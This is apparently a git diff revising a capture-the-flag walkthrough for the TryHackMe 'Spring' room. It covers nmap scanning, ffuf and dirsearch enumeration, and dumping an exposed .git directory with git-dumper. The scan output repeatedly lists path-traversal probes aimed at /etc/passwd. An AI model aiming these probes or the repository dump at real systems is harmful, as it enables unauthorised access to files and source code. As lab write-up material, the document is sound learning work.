@@ -1,7 +1,6 @@
 <h1 align="center"><a href="https://tryhackme.com/room/spring">Spring</a></h1>
-<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/158a4006-92e7-430d-a05f-1592c1cb84e3"><br>
-If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20JAN%2015-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p>
-
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/5a76ffb7-81da-49de-97f6-3f6212cbe01a"><br>
+If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20JAN%2016-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p>
 
 <br>
 <h2>Task 1 . Introduction</h2>
@@ -13,66 +12,70 @@ See if you can find a way to hack him.</p>
 
 <p><em>Answer the questions below</em></p>
 
+
 <br>
-<h1 align="center">Port Scanning<a id='1'></a></h1>
+<br>
+<h1 align="center">Static Host Mapping<a id='1'></a></h1>
+
+```bash
+xx.xx.xxx.xxx spring.thm
+```
+
+
+<br>
+<h1 align="center">Port Scanning<a id='2'></a></h1>
 
 <div align="center"><p>
 
 | **Port**           | **Service**          | **Version**                       |
 |-------------------:|:---------------------|:----------------------------------|
-| `22`               |`SSH`                 |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3  |
-| `80`               |`SMTP`                |Postfix smtpd                      |
-| `443`              |`SSL/HTTP`            |nginx 1.29.3                       |
+| `22`               |`SSH`                 |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3    |
+| `80`               |`HTTP`                |Apache Tomcat                      |
+| `443`              |`SSL/HTTP`            |Apache Tomcat                      |
 
 
 </p></div><br>
 
-
 ```bash
-:~/Spring# nmap -sC -sV -Pn -n -p- -T4 xx.xx.xxx.xxxx
+:~/Spring$ nmap -sC -sV -Pn -n -p- -T4 spring.thm
 ...
 PORT    STATE SERVICE   VERSION
 22/tcp  open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 ...
 80/tcp  open  http
-| fingerprint-strings: 
-|   GetRequest, HTTPOptions: 
-|     HTTP/1.1 302 
+| fingerprint-strings:
+|   GetRequest, HTTPOptions:
+|     HTTP/1.1 302
 |     Cache-Control: private
-|     Expires: Thu, 01 Jan 1970 ...
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
 |     Location: https://localhost/
 |     Content-Length: 0
-|     Date: Thu, 15 Jan 2026 ...
+|     Date: Fri, 16 Jan 2026 ...
 |     Connection: close
-|   RTSPRequest, X11Probe: 
-|     HTTP/1.1 400 
+|   RTSPRequest, X11Probe:
+|     HTTP/1.1 400
 |     Content-Type: text/html;charset=utf-8
 |     Content-Language: en
 |     Content-Length: 435
-|     Date: Thu, 15 Jan 2026...
+|     Date: Fri, 16 Jan 2026 ...
 |     Connection: close
-|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
-|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
 |_    Request</h1></body></html>
-|_http-title: Did not follow redirect to https://xx.xx.xxx.xxx/
+|_http-title: Did not follow redirect to https://spring.thm/
 443/tcp open  ssl/https
+| ssl-cert: Subject: commonName=John Smith/organizationName=spring.thm/stateOrProvinceName=Unknown/countryName=Unknown
+| Not valid before: 2020-07-04...
+|_Not valid after:  2294-04-18...
 |_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
-|_ssl-date: 2026-01-15T...; 0s from scanner time.
+|_ssl-date: 2026-01-16...; -1s from scanner time.
 ```
 
-<h1 align="center">File Enumeration<a id='2'></a></h1>
-<p align="left">
-  
-- /sources/<br>
-- /logout/<br><br>
-- /sources/new/.git/index/br>
-- /sources/new/.git/config/<br>
-- /sources/new/.git/HEAD/br><br>
-- /sources/new/.git/logs/HEAD</p>
+<br>
+<h1 align="center">Directory & File Enumeration<a id='4'></a></h1>
 
-
-<p>Used <code>ffuf</code>code> with the following parameters:<br>
+<p>Used <code>ffuf</code> with the following parameters:<br>
 
 - <code>-u</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Target URL<br>
 - <code>-w</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Wordlist file path and (optional) keyword separated by colon. eg. '/path/to/wordlist:KEYWORD'<br>
@@ -110,6 +113,32 @@ sources                 [Status: 302, Size: 0, Words: 1, Lines: 1]
 logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
 ```
 
+<br>
+<p>Used <code>dirsearch</code> with the following parameters:<br>
+
+- <code>-u</code> URL or <code>--Url</code>=URL &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Target URL(s), can use multiple flags<br>
+- <code>-t</code> THREADS or <code>--threads=</code>THREADS &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Number of threads<br>
+- <code>-r</code> or <code>--recursive</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Brute-force recursively<br>
+- <code>-R</code> DEPTH or <code>--max-recursion-depyh</code>=DEPTH &nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Maximum recursion depth<br>
+- <code>-e</code>EXTENSIONS or <code>--extensions</code>=EXTENSIONS &nbsp;&nbsp; : &nbsp; Extension list separated by commas (e.g. php,asp)</p>
+
+```bash
+:~/Spring$ dirsearch -u https://spring.thm/sources/ -t 200 -r -R 5 --exclude-sizes 0B -e php,txt,html,bak,zip,tar,gz,json,js,cgi,aspx
+...
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, txt, html, bak, zip, tar, gz, json, js, cgi, aspx | HTTP method: GET | Threads: 200 | Wordlist size: 14593
+...
+Target: https://spring.thm/
+
+[xx:xx:xx] Starting: sources/
+[xx:xx:xx] 500 -  455B  - /sources/%2e%2e//google.com
+[xx:xx:xx] 400 -  435B  - /sources/\..\..\..\..\..\..\..\..\..\etc\passwd
+[xx:xx:xx] 400 -  435B  - /sources/a%5c.aspx
+
+Task Completed
+```
 
 ```bash
 :~/Spring$ dirsearch -u https://spring.thm/sources/new -t 200 -r -R 5
@@ -122,87 +151,82 @@ logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
 
 Target: https://spring.thm/
 
-[20:24:32] Starting: sources/new/
-[20:24:41] 302 -    0B  - /sources/new/.git  ->  /sources/new/.git/
-[20:24:41] 200 -  148B  - /sources/new/.git/config
-[20:24:41] 200 -  401B  - /sources/new/.git/COMMIT_EDITMSG
-[20:24:41] 200 -   73B  - /sources/new/.git/description
-[20:24:41] 200 -    1KB - /sources/new/.git/index
-[20:24:41] 200 -  240B  - /sources/new/.git/info/exclude
-[20:24:42] 200 -  319B  - /sources/new/.git/logs/HEAD
-[20:24:42] 302 -    0B  - /sources/new/.git/logs/refs  ->  /sources/new/.git/logs/refs/
-[20:24:42] 302 -    0B  - /sources/new/.git/logs/refs/heads  ->  /sources/new/.git/logs/refs/heads/
-[20:24:42] 200 -  319B  - /sources/new/.git/logs/refs/heads/master
-[20:24:42] 302 -    0B  - /sources/new/.git/refs/heads  ->  /sources/new/.git/refs/heads/
+[xx:xx:xx] Starting: sources/new/
+...
+[xx:xx:xx] 200 -  148B  - /sources/new/.git/config
+[xx:xx:xx] 200 -  401B  - /sources/new/.git/COMMIT_EDITMSG
+[xx:xx:xx] 200 -   73B  - /sources/new/.git/description
+[xx:xx:xx] 200 -    1KB - /sources/new/.git/index
+[xx:xx:xx] 200 -  240B  - /sources/new/.git/info/exclude
+[xx:xx:xx] 200 -  319B  - /sources/new/.git/logs/HEAD
+...
+[xx:xx:xx] 200 -  319B  - /sources/new/.git/logs/refs/heads/master
+...
 Added to the queue: sources/new/.git/refs/heads/
-[20:24:42] 302 -    0B  - /sources/new/.git/refs/tags  ->  /sources/new/.git/refs/tags/
+...
 Added to the queue: sources/new/.git/refs/tags/
-[20:24:42] 200 -  355B  - /sources/new/.gitignore
+[xx:xx:xx] 200 -  355B  - /sources/new/.gitignore
 Added to the queue: sources/new/.git/
-[20:24:41] 200 -   23B  - /sources/new/.git/HEAD
+[xx:xx:xx] 200 -   23B  - /sources/new/.git/HEAD
 Added to the queue: sources/new/.git/logs/refs/
-[20:24:42] 200 -   41B  - /sources/new/.git/refs/heads/master
+[xx:xx:xx] 200 -   41B  - /sources/new/.git/refs/heads/master
 Added to the queue: sources/new/.git/logs/refs/heads/
-[20:24:52] 400 -  435B  - /sources/new/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:24:54] 400 -  435B  - /sources/new/a%5c.aspx
+[xx:xx:xx] 400 -  435B  - /sources/new/\..\..\..\..\..\..\..\..\..\etc\passwd
+[xx:xx:xx] 400 -  435B  - /sources/new/a%5c.aspx
 
-[20:26:04] Starting: sources/new/.git/refs/heads/
-[20:26:16] 400 -  435B  - /sources/new/.git/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:26:17] 400 -  435B  - /sources/new/.git/refs/heads/a%5c.aspx
+[xx:xx:xx] Starting: sources/new/.git/refs/heads/
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/refs/heads/a%5c.aspx
 
-[20:27:28] Starting: sources/new/.git/refs/tags/
-[20:27:36] 400 -  435B  - /sources/new/.git/refs/tags/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:27:37] 400 -  435B  - /sources/new/.git/refs/tags/a%5c.aspx
+[xx:xx:xx] Starting: sources/new/.git/refs/tags/
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/refs/tags/\..\..\..\..\..\..\..\..\..\etc\passwd
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/refs/tags/a%5c.aspx
 
-[20:28:42] Starting: sources/new/.git/
-[20:28:54] 400 -  435B  - /sources/new/.git/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:28:55] 400 -  435B  - /sources/new/.git/a%5c.aspx
-[20:29:12] 500 -  455B  - /sources/new/.git/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-[20:29:26] 302 -    0B  - /sources/new/.git/info  ->  /sources/new/.git/info/
+[xx:xx:xx] Starting: sources/new/.git/
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/\..\..\..\..\..\..\..\..\..\etc\passwd
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/a%5c.aspx
+[xx:xx:xx] 500 -  455B  - /sources/new/.git/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+...
 Added to the queue: sources/new/.git/info/
-[20:29:30] 302 -    0B  - /sources/new/.git/logs  ->  /sources/new/.git/logs/
+...
 Added to the queue: sources/new/.git/logs/
-[20:29:34] 302 -    0B  - /sources/new/.git/objects  ->  /sources/new/.git/objects/
+...
 Added to the queue: sources/new/.git/objects/
 
-[20:30:02] Starting: sources/new/.git/logs/refs/
-[20:30:11] 400 -  435B  - /sources/new/.git/logs/refs/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:30:12] 400 -  435B  - /sources/new/.git/logs/refs/a%5c.aspx
+[xx:xx:xx] Starting: sources/new/.git/logs/refs/
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/logs/refs/\..\..\..\..\..\..\..\..\..\etc\passwd
+[xx:xx:xx]] 400 -  435B  - /sources/new/.git/logs/refs/a%5c.aspx
 
-[20:31:17] Starting: sources/new/.git/logs/refs/heads/
-[20:31:26] 400 -  435B  - /sources/new/.git/logs/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:31:27] 400 -  435B  - /sources/new/.git/logs/refs/heads/a%5c.aspx
+[xx:xx:xx] Starting: sources/new/.git/logs/refs/heads/
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/logs/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/logs/refs/heads/a%5c.aspx
 [################    ] 84%   9723/11460       109/s       job:6/9  errors:0
 
-[20:32:43] Starting: sources/new/.git/info/
-[20:32:45] 500 -  455B  - /sources/new/.git/info/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-[20:32:53] 400 -  435B  - /sources/new/.git/info/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:32:53] 400 -  435B  - /sources/new/.git/info/a%5c.aspx
+[xx:xx:xx] Starting: sources/new/.git/info/
+[xx:xx:xx] 500 -  455B  - /sources/new/.git/info/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/info/\..\..\..\..\..\..\..\..\..\etc\passwd
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/info/a%5c.aspx
 
-[20:33:56] Starting: sources/new/.git/logs/
-[20:33:58] 500 -  455B  - /sources/new/.git/logs/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-[20:34:06] 400 -  435B  - /sources/new/.git/logs/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:34:07] 400 -  435B  - /sources/new/.git/logs/a%5c.aspx
+[xx:xx:xx] Starting: sources/new/.git/logs/
+[xx:xx:xx] 500 -  455B  - /sources/new/.git/logs/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/logs/\..\..\..\..\..\..\..\..\..\etc\passwd
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/logs/a%5c.aspx
 
-[20:35:08] Starting: sources/new/.git/objects/
-[20:35:10] 500 -  455B  - /sources/new/.git/objects/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-[20:35:17] 302 -    0B  - /sources/new/.git/objects/06  ->  /sources/new/.git/objects/06/
+[xx:xx:xx] Starting: sources/new/.git/objects/
+[xx:xx:xx] 500 -  455B  - /sources/new/.git/objects/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+...
 Added to the queue: sources/new/.git/objects/06/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/29  ->  /sources/new/.git/objects/29/
+...
 Added to the queue: sources/new/.git/objects/29/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/39  ->  /sources/new/.git/objects/39/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/66  ->  /sources/new/.git/objects/66/
+...
 Added to the queue: sources/new/.git/objects/66/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/69  ->  /sources/new/.git/objects/69/
+...
 Added to the queue: sources/new/.git/objects/69/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/71  ->  /sources/new/.git/objects/71/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/80  ->  /sources/new/.git/objects/80/
+...
 Added to the queue: sources/new/.git/objects/39/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/93  ->  /sources/new/.git/objects/93/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/92  ->  /sources/new/.git/objects/92/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/98  ->  /sources/new/.git/objects/98/
-[20:35:18] 400 -  435B  - /sources/new/.git/objects/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/67  ->  /sources/new/.git/objects/67/
+...
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/objects/\..\..\..\..\..\..\..\..\..\etc\passwd
+...
 Added to the queue: sources/new/.git/objects/71/
 Added to the queue: sources/new/.git/objects/80/
 Added to the queue: sources/new/.git/objects/93/
@@ -210,50 +234,63 @@ Added to the queue: sources/new/.git/objects/92/
 Added to the queue: sources/new/.git/objects/98/
 Added to the queue: sources/new/.git/objects/67/
 [20:35:19] 400 -  435B  - /sources/new/.git/objects/a%5c.aspx
-[20:35:34] 302 -    0B  - /sources/new/.git/objects/cc  ->  /sources/new/.git/objects/cc/
+...
 Added to the queue: sources/new/.git/objects/cc/
-[20:35:46] 302 -    0B  - /sources/new/.git/objects/info  ->  /sources/new/.git/objects/info/
+...
 Added to the queue: sources/new/.git/objects/info/
 
-[20:36:22] Starting: sources/new/.git/objects/06/
-[20:36:35] 400 -  435B  - /sources/new/.git/objects/06/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:36:36] 400 -  435B  - /sources/new/.git/objects/06/a%5c.aspx
+[xx:xx:xx]] Starting: sources/new/.git/objects/06/
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/objects/06/\..\..\..\..\..\..\..\..\..\etc\passwd
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/objects/06/a%5c.aspx
 
-[20:37:50] Starting: sources/new/.git/objects/29/
-[20:37:59] 400 -  435B  - /sources/new/.git/objects/29/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:38:00] 400 -  435B  - /sources/new/.git/objects/29/a%5c.aspx
+[xx:xx:xx] Starting: sources/new/.git/objects/29/
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/objects/29/\..\..\..\..\..\..\..\..\..\etc\passwd
+[xx:xx:xx] 400 -  435B  - /sources/new/.git/objects/29/a%5c.aspx
 [########            ] 43%   4980/11460       176/s       job:11/22 errors:0
 ```
 
+<p align="left">
+  
+- /sources/<br>
+- /logout/<br><br>
+- /sources/new/.git/config<br>
+- /sources/new/.git/COMMIT_EDITMSG<br>
+- /sources/new/.git/description<br>
+- /sources/new/.git/index<br>
+- /sources/new/.git/info/exclude<br>
+- /sources/new/.git/logs/HEAD<br>
+- /sources/new/.git/logs/refs/heads/master<br>
+- /sources/new/.gitignore<br>
+- /sources/new/.git/HEAD<br>
+- /sources/new/.git/refs/heads/master<br>
+- /sources/new/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
+- /sources/new/.git/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
+- /sources/new/.git/refs/heads/a%5c.aspx<br>
+- /sources/new/.git/refs/tags/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
+- /sources/new/.git/refs/tags/a%5c.aspx<br>
+- /sources/new/.git/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
+- /sources/new/.git/a%5c.aspx<br>
+- /sources/new/.git/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<br>
+- /sources/new/.git/logs/refs/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
+- /sources/new/.git/logs/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
+- /sources/new/.git/logs/refs/heads/a%5c.aspx<br>
+- /sources/new/.git/info/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<br>
+- /sources/new/.git/info/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
+- /sources/new/.git/info/a%5c.aspx<br>
+- /sources/new/.git/logs/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<br>
+- /sources/new/.git/logs/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
+- /sources/new/.git/logs/a%5c.aspx<br>
+- /sources/new/.git/objects/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<br>
+- /sources/new/.git/objects/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
+- /sources/new/.git/objects/a%5c.aspx<br>
+- /sources/new/.git/objects/06/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
+- /sources/new/.git/objects/06/a%5c.aspx<br>
+- /sources/new/.git/objects/29/\..\..\..\..\..\..\..\..\..\etc\passwd<br>
+- /sources/new/.git/objects/29/a%5c.aspx</p>
 
 
-```bash
-:~/Spring# ffuf -u https://xx.xx.xxx.xxx:443/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302 -ic -c -t 60
-
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v1.3.1
-________________________________________________
-
- :: Method           : GET
- :: URL              : https://xx.xx.xxx.xxx:443/FUZZ
- :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 60
- :: Matcher          : Response status: 200,301,302
-________________________________________________
-
-                        [Status: 200, Size: 13, Words: 2, Lines: 1]
-sources                 [Status: 302, Size: 0, Words: 1, Lines: 1]
-logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
-```
+<br>
+<h1 align="center">Git Dump Installation<a id='5'></a></h1>
 
 ```bash
 $ python3 -m venv venv
@@ -264,191 +301,30 @@ $ source venv/bin/activate
 ```
 
 ```bash
-(venv) c:~/Spring$ pip3 install git-dumper
+(venv) ...:~/Spring$ pip3 install git-dumper
+```
+
+<br>
+<h1 align="center">Git Dump<a id='6'></a></h1>
+
+```bash
+(venv) ...:~/Spring$ git-dumper https://spring.thm/sources/new/.git/ /.../.../Spring/data
 ```
 
 ```bash
-(venv) c:~/Spring$ git-dumper https://spring.thm/sources/new/.git/ /home/cyberlaser/Spring/data
-```
-
-```bash
-(venv) c:~/Spring$ git-dumper https://spring.thm/sources/new/.git/ /home/cyberlaser/Spring/data
-```
-
-```bash
-:~/Spring$ dirsearch -u https://spring.thm/sources/new -t 200 -r -R 5
-...
-
-  _|. _ _  _  _  _ _|_    v0.4.3
- (_||| _) (/_(_|| (_| )
-
-Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 200 | Wordlist size: 11460
-
-...
-Target: https://spring.thm/
-
-[xx:xx:xx] Starting: sources/new/
-[20:24:41] 302 -    0B  - /sources/new/.git  ->  /sources/new/.git/
-[20:24:41] 200 -  148B  - /sources/new/.git/config
-[20:24:41] 200 -  401B  - /sources/new/.git/COMMIT_EDITMSG
-[20:24:41] 200 -   73B  - /sources/new/.git/description
-[20:24:41] 200 -    1KB - /sources/new/.git/index
-[20:24:41] 200 -  240B  - /sources/new/.git/info/exclude
-[20:24:42] 200 -  319B  - /sources/new/.git/logs/HEAD
-[20:24:42] 302 -    0B  - /sources/new/.git/logs/refs  ->  /sources/new/.git/logs/refs/
-[20:24:42] 302 -    0B  - /sources/new/.git/logs/refs/heads  ->  /sources/new/.git/logs/refs/heads/
-[20:24:42] 200 -  319B  - /sources/new/.git/logs/refs/heads/master
-[20:24:42] 302 -    0B  - /sources/new/.git/refs/heads  ->  /sources/new/.git/refs/heads/
-Added to the queue: sources/new/.git/refs/heads/
-[20:24:42] 302 -    0B  - /sources/new/.git/refs/tags  ->  /sources/new/.git/refs/tags/
-Added to the queue: sources/new/.git/refs/tags/
-[20:24:42] 200 -  355B  - /sources/new/.gitignore
-Added to the queue: sources/new/.git/
-[20:24:41] 200 -   23B  - /sources/new/.git/HEAD
-Added to the queue: sources/new/.git/logs/refs/
-[20:24:42] 200 -   41B  - /sources/new/.git/refs/heads/master
-Added to the queue: sources/new/.git/logs/refs/heads/
-[20:24:52] 400 -  435B  - /sources/new/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:24:54] 400 -  435B  - /sources/new/a%5c.aspx
-
-[20:26:04] Starting: sources/new/.git/refs/heads/
-[20:26:16] 400 -  435B  - /sources/new/.git/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:26:17] 400 -  435B  - /sources/new/.git/refs/heads/a%5c.aspx
-
-[20:27:28] Starting: sources/new/.git/refs/tags/
-[20:27:36] 400 -  435B  - /sources/new/.git/refs/tags/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:27:37] 400 -  435B  - /sources/new/.git/refs/tags/a%5c.aspx
-
-[20:28:42] Starting: sources/new/.git/
-[20:28:54] 400 -  435B  - /sources/new/.git/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:28:55] 400 -  435B  - /sources/new/.git/a%5c.aspx
-[20:29:12] 500 -  455B  - /sources/new/.git/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-[20:29:26] 302 -    0B  - /sources/new/.git/info  ->  /sources/new/.git/info/
-Added to the queue: sources/new/.git/info/
-[20:29:30] 302 -    0B  - /sources/new/.git/logs  ->  /sources/new/.git/logs/
-Added to the queue: sources/new/.git/logs/
-[20:29:34] 302 -    0B  - /sources/new/.git/objects  ->  /sources/new/.git/objects/
-Added to the queue: sources/new/.git/objects/
-
-[20:30:02] Starting: sources/new/.git/logs/refs/
-[20:30:11] 400 -  435B  - /sources/new/.git/logs/refs/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:30:12] 400 -  435B  - /sources/new/.git/logs/refs/a%5c.aspx
-
-[20:31:17] Starting: sources/new/.git/logs/refs/heads/
-[20:31:26] 400 -  435B  - /sources/new/.git/logs/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:31:27] 400 -  435B  - /sources/new/.git/logs/refs/heads/a%5c.aspx
-[################    ] 84%   9723/11460       109/s       job:6/9  errors:0
-
-[20:32:43] Starting: sources/new/.git/info/
-[20:32:45] 500 -  455B  - /sources/new/.git/info/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-[20:32:53] 400 -  435B  - /sources/new/.git/info/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:32:53] 400 -  435B  - /sources/new/.git/info/a%5c.aspx
-
-[20:33:56] Starting: sources/new/.git/logs/
-[20:33:58] 500 -  455B  - /sources/new/.git/logs/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-[20:34:06] 400 -  435B  - /sources/new/.git/logs/\..\..\..\..\..\..\..\..\..\etc\passwd
-[20:34:07] 400 -  435B  - /sources/new/.git/logs/a%5c.aspx
-
-[20:35:08] Starting: sources/new/.git/objects/
-[20:35:10] 500 -  455B  - /sources/new/.git/objects/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-[20:35:17] 302 -    0B  - /sources/new/.git/objects/06  ->  /sources/new/.git/objects/06/
-Added to the queue: sources/new/.git/objects/06/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/29  ->  /sources/new/.git/objects/29/
-Added to the queue: sources/new/.git/objects/29/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/39  ->  /sources/new/.git/objects/39/
-[20:35:18] 302 -    0B  - /sources/new/.git/objects/66  ->  /sources/new/.git/objects/66/
